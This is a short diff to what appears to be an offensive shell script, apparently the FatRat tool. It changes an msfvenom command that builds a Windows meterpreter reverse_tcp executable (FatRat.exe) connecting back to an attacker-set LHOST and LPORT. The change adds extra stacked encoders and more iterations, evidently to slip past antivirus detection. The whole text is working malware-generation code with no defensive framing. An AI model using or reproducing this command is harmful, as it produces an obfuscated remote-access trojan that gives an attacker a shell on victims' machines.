@@ -225,7 +225,7 @@ echo""
 				cd "output"
 				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport
-         			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o FatRat.exe
+         			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$yourip LPORT=$yourport -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o FatRat.exe
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '3'
 				then
